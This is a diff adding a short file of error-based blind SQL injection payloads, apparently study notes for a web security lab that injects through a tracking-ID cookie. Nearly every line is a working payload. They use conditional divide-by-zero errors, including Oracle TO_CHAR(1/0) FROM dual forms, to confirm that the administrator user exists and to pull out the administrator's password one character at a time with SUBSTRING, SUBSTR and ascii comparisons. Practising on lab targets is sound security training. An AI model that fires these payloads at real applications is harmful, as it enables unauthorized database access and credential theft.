@@ -1,0 +1,19 @@
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+select trackingId from all_tracking_ids where trackingId = <trackingId>
+
+' and (select case when (1=2) then 1/0 else 'a' end)='a
+
+
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+
+' AND (SELECT CASE WHEN (SELECT username FROM users WHERE username = 'administrator')='administrator' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
+' AND (SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
+' AND (SELECT CASE WHEN (SELECT ascii(SUBSTR(password,1,1)) FROM users WHERE username = 'administrator')=ascii('a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
